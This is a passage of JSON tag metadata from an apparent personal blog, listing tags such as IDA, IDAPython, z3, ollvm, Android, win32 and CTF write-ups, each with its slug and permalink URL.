m","slug":"vm","permalink":"https://zzzzsky.github.io/tags/vm/"},{"name":"图","slug":"图","permalink":"https://zzzzsky.github.io/tags/%E5%9B%BE/"},{"name":"最短路径","slug":"最短路径","permalink":"https://zzzzsky.github.io/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"},{"name":"IDAPython","slug":"IDAPython","permalink":"https://zzzzsky.github.io/tags/IDAPython/"},{"name":"IDA","slug":"IDA","permalink":"https://zzzzsky.github.io/tags/IDA/"},{"name":"debug","slug":"debug","permalink":"https://zzzzsky.github.io/tags/debug/"},{"name":"struct","slug":"struct","permalink":"https://zzzzsky.github.io/tags/struct/"},{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"z3","slug":"z3","permalink":"https://zzzzsky.github.io/tags/z3/"},{"name":"ollvm","slug":"ollvm","permalink":"https://zzzzsky.github.io/tags/ollvm/"},{"name":"真机调试","slug":"真机调试","permalink":"https://zzzzsky.github.io/tags/%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95/"},{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/tags/%E5%AE%89%E5%8D%93/"},{"name":"win32","slug":"win32","permalink":"https://zzzzsky.github.io/tags/win32/"}]}